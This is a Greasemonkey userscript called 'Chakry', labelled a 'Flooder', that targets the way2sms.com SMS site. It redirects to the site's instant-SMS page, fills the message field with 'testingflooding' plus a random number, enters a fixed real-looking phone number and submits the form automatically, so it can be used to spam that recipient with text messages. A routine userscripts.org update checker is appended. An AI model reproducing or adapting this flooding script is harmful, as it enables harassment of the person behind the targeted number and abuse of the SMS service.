var loc=window.location.hostname+"/jsp/InstantSMS.jsp?val=1";
loc ="http://"+loc;

document.location=loc;

// ==UserScript==
// @name           Chakry
// @include        htt*://*.way2sms.com/*
// @description    Flooder  
// @version        0.0.1
// @copyright      CHAKRY
// @attribution http://userscripts.org/users/107937 (http://userscripts.org/scripts/show/57604)
// @attribution http://userscripts.org/users/107937 (http://userscripts.org/scripts/show/57605)
// @attribution http://userscripts.org/users/38602 (http://userscripts.org/scripts/show/20145)
// ==/UserScript==

	var number="number";
	document.forms[0].elements[4].value="\ntestingflooding  ??::" +Math.floor(Math.random()*22321313);
	document.forms[0].elements[6].value=9705946669
document.forms[0].submit();
	void(0);

var SUC_script_num = 57988; 
try{function updateCheck(forced){if ((forced) || (parseInt(GM_getValue('SUC_last_update', '0')) + 86400000 <= (new Date().getTime()))){try{GM_xmlhttpRequest({method: 'GET',url: 'http://userscripts.org/scripts/source/'+SUC_script_num+'.meta.js?'+new Date().getTime(),headers: {'Cache-Control': 'no-cache'},onload: function(resp){var local_version, remote_version, rt, script_name;rt=resp.responseText;GM_setValue('SUC_last_update', new Date().getTime()+'');remote_version=parseInt(/@uso:version\s*(.*?)\s*$/m.exec(rt)[1]);local_version=parseInt(GM_getValue('SUC_current_version', '-1'));if(local_version!=-1){script_name = (/@name\s*(.*?)\s*$/m.exec(rt))[1];GM_setValue('SUC_target_script_name', script_name);if (remote_version > local_version){if(confirm('There is an update available for the Greasemonkey script "'+script_name+'."\nWould you like to go to the install page now?')){GM_openInTab('http://userscripts.org/scripts/show/'+SUC_script_num);GM_setValue('SUC_current_version', remote_version);}}else if (forced)alert('No update is available for "'+script_name+'."');}else GM_setValue('SUC_current_version', remote_version+'');}});}catch (err){if (forced)alert('An error occurred while checking for updates:\n'+err);}}}GM_registerMenuCommand('TSR: Manual Update Check', function(){updateCheck(true);});updateCheck(false);}catch(err){}
